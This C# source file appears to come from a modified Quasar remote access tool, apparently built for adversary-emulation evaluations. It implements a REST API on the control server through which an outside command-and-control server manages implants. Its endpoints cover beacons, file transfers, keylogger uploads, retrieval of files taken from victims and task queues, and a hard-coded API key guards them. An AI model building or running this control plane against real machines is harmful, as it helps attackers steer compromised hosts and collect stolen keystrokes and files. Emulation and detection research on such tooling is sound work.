using Quasar.Common.Logger;
using Quasar.Server.Forms;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mime;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

namespace Quasar.Server.RestApi
{
    /// <summary>
    /// Handles REST API requests from the Evals C2 server for programatically managing Quasar implants
    /// </summary>
    public static partial class RestServer
    {
        public static FrmMain mainForm;
        public static HttpListener restApiListener;
        public static int restApiPort = 8888;
        public static string bindHost = "0.0.0.0";
        public const string BASE_ENDPOINT = "/api/";
        public const string BEACON_ENDPOINT = BASE_ENDPOINT + "beacons";
        public const string FILE_TRANSFER_ENDPOINT = BASE_ENDPOINT + "transfers";
        public const string UPLOADED_FILES_ENDPOINT = BASE_ENDPOINT + "uploadedfiles";
        public const string KEYLOGGER_UPLOAD_ENDPOINT = FILE_TRANSFER_ENDPOINT + "/keylogger";
        public const string BASE_TASKS_ENDPOINT = BASE_ENDPOINT + "tasks";
        public const string API_KEY = "81152cc4c24d327f8fe800afbfb9777c";
        public const string API_KEY_HEADER = "APIKEY";

        /// <summary>
        /// Handle exceptions by logging them.
        /// </summary>
        private static void HandleApiRequestExceptionHandler(Task task) 
        {
            Logger.Error("Exception from HandleApiRequest: " + task.Exception.ToString());
        }

        /// <summary>
        /// Send response to API client.
        /// </summary>
        private static void SendResponse(HttpListenerResponse response, HttpStatusCode statusCode, byte[] message)
        {
            response.StatusCode = (int)statusCode;
            response.ContentLength64 = message.Length;
            response.OutputStream.Write(message, 0, message.Length);
            response.OutputStream.Close();
        }

        /// <summary>
        /// Send response to API client.
        /// </summary>
        private static void SendResponse(HttpListenerResponse response, HttpStatusCode statusCode, string message)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(message);
            SendResponse(response, statusCode, buffer);
        }

        private static void SendSuccessResponse(HttpListenerResponse response, string message)
        {
            byte[] buffer = Encoding.UTF8.GetBytes(message);
            SendResponse(response, HttpStatusCode.OK, buffer);
        }

        private static void SendSuccessResponse(HttpListenerResponse response, byte[] message)
        {
            SendResponse(response, HttpStatusCode.OK, message);
        }

        // Reference: https://stackoverflow.com/a/13386573
        private static void SendFileDataResponse(HttpListenerResponse response, string filepath)
        {
            try
            {
                string filename = Path.GetFileName(filepath);
                using (FileStream fs = File.OpenRead(filepath))
                {
                    response.ContentLength64 = fs.Length;
                    response.ContentType = MediaTypeNames.Application.Octet;
                    response.AddHeader("Content-Disposition", "attachment; filename=" + filename);

                    // Read in file data
                    byte[] buf = new byte[READ_BUF_LEN];
                    int num_bytes_read;
                    while ((num_bytes_read = fs.Read(buf, 0, READ_BUF_LEN)) > 0)
                    {
                        response.OutputStream.Write(buf, 0, num_bytes_read);
                    }
                }
                response.StatusCode = (int)HttpStatusCode.OK;
                response.OutputStream.Close();
            }
            catch (Exception ex)
            {
                Logger.Error("SendFileDataResponse exception: " + ex.ToString());
                SendResponse(response, HttpStatusCode.InternalServerError, ex.Message);
            }
        }
        
        /*
         * GENERAL API FUNCTIONS
         */

        private static Dictionary<string, JsonElement> GetApiRequestPostData(HttpListenerRequest request)
        {
            Stream body = request.InputStream;
            Encoding encoding = request.ContentEncoding;
            Dictionary<string, JsonElement> apiRequestDict;
            try
            {
                using (StreamReader reader = new StreamReader(body, encoding))
                {
                    string data = reader.ReadToEnd();
                    apiRequestDict = JsonSerializer.Deserialize<Dictionary<string, JsonElement>>(data);
                }
            }
            finally
            {
                body.Close();
            }
                
            // Debugging
            foreach (KeyValuePair<string, JsonElement> kvp in apiRequestDict)
            {
                Logger.Debug(String.Format("Api request JSON dict key = {0}, Value = {1}", kvp.Key, kvp.Value));
            }

            return apiRequestDict;
        }

        private static string TrimBasePath(string uri, string baseToTrim)
        {
            return uri.ToLower().StartsWith(baseToTrim.ToLower()) ? uri.Substring(baseToTrim.Length) : uri;
        }

        private static bool AuthenticatedApiRequest(HttpListenerRequest request)
        {
            string apiKey = request.Headers[API_KEY_HEADER];
            if (string.IsNullOrEmpty(apiKey))
            {
                Logger.Debug("No API key provided.");
                return false;
            }
            else if (apiKey != API_KEY)
            {
                Logger.Debug("Incorrect API key provided.");
                return false;
            }
            return true;
        }

        private static void HandleApiRequest(HttpListenerRequest request, HttpListenerResponse response)
        {
            string requestedPath = request.Url.AbsolutePath;
            Logger.Debug(String.Format("Received REST API {2} request for {0} from {1}", requestedPath, request.RemoteEndPoint.ToString(), request.HttpMethod));

            // Verify authentication
            if (!AuthenticatedApiRequest(request)) {
                Logger.Debug("REST API request not authenticated. Sending 401 response.");
                SendResponse(response, HttpStatusCode.Unauthorized, "Unauthorized.");
                return;
            }

            string lPath = requestedPath.ToLower();
            if (lPath == BEACON_ENDPOINT)
            {
                HandleBeaconEndpointGet(request, response);
            }
            else if (lPath == FILE_TRANSFER_ENDPOINT)
            {
                HandleTransferEndpoint(request, response);
            }
            else if (lPath == KEYLOGGER_UPLOAD_ENDPOINT)
            {
                HandleKeyloggerEndpoint(request, response);
            }
            else if (lPath.StartsWith(KEYLOGGER_UPLOAD_ENDPOINT + "/"))
            {
                HandleSpecificKeyloggerUploadEndpoint(request, response, requestedPath);
            }
            else if (lPath.StartsWith(FILE_TRANSFER_ENDPOINT + "/"))
            {
                HandleSpecificTransferEndpoint(request, response, requestedPath);
            }
            else if (lPath == UPLOADED_FILES_ENDPOINT)
            {
                HandleEnumerateUploadedFiles(request, response);
            }
            else if (lPath.StartsWith(UPLOADED_FILES_ENDPOINT + "/"))
            {
                HandleGetUploadedFile(request, response, requestedPath);
            }
            else if (lPath == BASE_TASKS_ENDPOINT)
            {
                HandleTaskEndpoint(request, response);
            }
            else if (lPath.StartsWith(BASE_TASKS_ENDPOINT + "/"))
            {
                HandleSpecificTaskEndpoint(request, response, requestedPath);
            }
            else
            {
                Logger.Error("Unsupported resource " + requestedPath);
                SendResponse(response, HttpStatusCode.NotFound, requestedPath + " does not exist.");
            }
        }

        private static Task HandleRestConnections() 
        {
            // Reference: https://learn.microsoft.com/en-us/dotnet/api/system.net.httplistener?view=netframework-4.7.2
            while (true)
            {
                HttpListenerContext context = restApiListener.GetContext(); // blocking
                HttpListenerRequest request = context.Request;
                HttpListenerResponse response = context.Response;

                try
                {
                    Task requestHandlerTask = new Task(() => HandleApiRequest(request, response));
                    requestHandlerTask.ContinueWith(HandleApiRequestExceptionHandler, TaskContinuationOptions.OnlyOnFaulted); // set exception handler
                    requestHandlerTask.Start();
                }
                catch (Exception ex)
                {
                    Logger.Error("Failed to start new task to handle API request: " + ex.ToString());
                    SendResponse(response, HttpStatusCode.InternalServerError, "Internal server error");
                }
            }
        }

        /// <summary>
        /// Start the REST API server using the provided bind address.
        /// </summary>
        public static bool StartRestServer(FrmMain serverMainForm, string restAddr, int restPort)
        {
            mainForm = serverMainForm;
            restApiListener = new HttpListener();

            // Set up listener
            string restUrl = String.Format("http://{0}:{1}{2}", restAddr, restPort, BASE_ENDPOINT);

            try
            {
                restApiListener.Prefixes.Add(restUrl);
                Logger.Info("REST API server binding to " + restUrl);
                restApiListener.Start();
                Logger.Debug("Started REST API listener.");
            }
            catch (Exception ex)
            {
                Logger.Error("Exception when starting REST API server: " + ex.ToString());
                return false;
            }
            
            // Handle connections
            try
            {
                Task.Run(() =>
                {
                    try 
                    {
                        HandleRestConnections();
                    }
                    catch (Exception ex) 
                    {
                        Logger.Error("Unhandled exception from REST API handler task: " + ex.ToString());
                    }
                    finally
                    {
                        restApiListener.Stop();
                    }
                });
            }
            catch (Exception ex) 
            {
                Logger.Error("Exception when starting REST API background task: " + ex.ToString());
                return false;
            }
            Logger.Debug("Started REST API handler background task.");
            return true;
        }

        public static void StopRestServer()
        {
            restApiListener.Stop();
        }
    }
}